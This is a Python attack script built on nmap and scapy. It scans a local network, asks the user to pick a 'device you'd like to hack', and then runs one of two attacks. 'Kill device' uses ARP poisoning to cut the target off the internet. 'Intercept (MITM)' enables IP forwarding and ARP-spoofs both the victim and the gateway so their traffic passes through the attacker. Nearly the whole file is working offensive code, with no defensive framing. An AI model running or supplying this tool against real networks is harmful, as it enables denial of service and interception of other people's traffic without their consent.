#!/usr/bin/python

import nmap
import sys
import os
import platform as machine
from time import sleep
from scapy.all import *

CONST_OSX = "Darwin"
CONST_LINUX = "Linux"
CONST_MAC_ADDRESS_CLEAN_PATTERN = "ff:ff:ff:ff:ff:ff"

interface = "eth0"

def scanNetwork():
    # check if device has nmap
    try:
        nm = nmap.PortScanner()
    except nmap.PortScannerError:
        print ("Nmap not found", sys.exc_info()[0])
        sys.exit(1)
    except:
        print ("Unexpected error:", sys.exc_info()[0])
        sys.exit(1)

    # initiate scan
    the_hosts = {}
    count = 0
    nm.scan("192.168.86.0/24", arguments="-sn -PR --random")  # flags
    print ("Beginning scan")
    for h in nm.all_hosts():
        if "mac" in nm[h]["addresses"]:  # print mac address & vendor
            print ()
            count += 1
            host_number = str(count) + "."
            host_ip = nm[h]["addresses"]["ipv4"]
            host_mac = nm[h]["addresses"]["mac"]
            host_name = nm[h]["hostnames"][0]["name"]
            host_vendor = nm[h]["vendor"]

            the_hosts[count] = [host_ip, host_mac, host_name]

            if host_name == "":
                host_name = "Unknown"

            try:
                print (host_number, host_ip, "\t", host_name)
                print ("  ", host_mac, "\t", host_vendor[host_mac])
            except:
                print (host_number, host_ip, "\t", host_name)
                print ("  ", host_mac)
    print()

    user_choice = int(input("Type the number of the device you'd like to hack: "))

    menu(the_hosts, user_choice)

def portForwarding(flag=1):
    # 1 - enable port forwarding
    # 0 - disable port forwarding
    flag = str(flag)
    if machine.system() == CONST_LINUX:
        # case we deal with linux os
        os.system("echo " + flag + " > /proc/sys/net/ipv4/ip_forward")
    elif machine.system() == CONST_OSX:
        # case we deal with OSX - Darwin
        os.system("sysctl -w net.inet.ip.forwarding=" + flag)
    else:
        print("Could not use port forwarding, you may want to try enable it manually...")

def getMac(victim_ip, interface):
    # if we need to get an uncaptured mac address
    ans, unans = srp(Ether(dst=CONST_MAC_ADDRESS_CLEAN_PATTERN) / ARP(pdst=victim_ip), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def poison(victim_ip, victim_mac, gateway_ip):
    # send the victim an ARP packet pairing the gateway ip with the wrong mac address

    packet = ARP(op=2, psrc=gateway_ip, hwsrc="12:34:56:78:9A:BC", pdst=victim_ip, hwdst=victim_mac)
    send(packet, verbose=0)


def restorePoision(victim_ip, victim_mac, gateway_ip, gateway_mac):
    # send the victim an ARP packet pairing the gateway ip with the correct mac address

    print("Restoring Targets...")
    packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
    send(packet, verbose=0)

def mitm(victim_mac, gateway_mac, victim_ip, gateway_ip, interface):
    # send the victims an ARP packet pairing the gateway ip with the wrong mac address

    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac))
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac))

def restoreMitm(victim_ip, victim_mac, gateway_ip, gateway_mac):
    # send the victims an ARP packet pairing the gateway ip with the correct mac address

    print("Restoring Targets...")
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=CONST_MAC_ADDRESS_CLEAN_PATTERN, hwsrc=victim_mac), count=7)
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=CONST_MAC_ADDRESS_CLEAN_PATTERN, hwsrc=gateway_mac), count=7)
    print("Disabling IP Forwarding...")
    portForwarding(0)
    print("Shutting Down...")

def menu(the_hosts, user_choice):
    print()
    menu_choice = int(input("Type the number of the option you want:\n"
                            "1. Kill device\n"
                            "2. Intercept (MITM)\n"
                            ": "))

    if menu_choice == 1:
        kill(the_hosts, user_choice)
    elif menu_choice == 2:
        intercept(the_hosts, user_choice)
    else:
        print("Please type a number from the options.\n")
        menu(the_hosts)


def kill(the_hosts, user_choice):
    gateway_ip = "192.168.86.1"
    gateway_mac = getMac(gateway_ip, interface).upper()

    victim_ip = the_hosts[user_choice][0]
    victim_mac = the_hosts[user_choice][1]

    # loop the poison function until we get a keyboard inturrupt (ctl-c)

    print("Preventing {} from accessing the internet...".format(the_hosts[user_choice]))
    try:
        while True:
            poison(victim_ip, victim_mac, gateway_ip)
    except KeyboardInterrupt:
        restorePoision(victim_ip, victim_mac, gateway_ip, gateway_mac)
        print("Restored.")

def intercept(the_hosts, user_choice):
    gateway_ip = "192.168.86.1"
    gateway_mac = getMac(gateway_ip, interface)

    victim_ip = the_hosts[user_choice][0]
    victim_mac = the_hosts[user_choice][1]

    # loop the spoof function until we get a keyboard inturrupt (ctl-c)

    print("MITM attack {} to your machine...".format(the_hosts[user_choice]))

    try:
        portForwarding(1)
        print("Poisoning Target...")
        while True:
            mitm(victim_mac, gateway_mac, victim_ip, gateway_ip, interface)
            sleep(1.5)
    except KeyboardInterrupt:
        restoreMitm(victim_ip, victim_mac, gateway_ip, gateway_mac)
        portForwarding(0)
        print("Exiting...")
        sys.exit(1)
    except:
        portForwarding(0)
        print("Exiting...")
        sys.exit(1)

scanNetwork()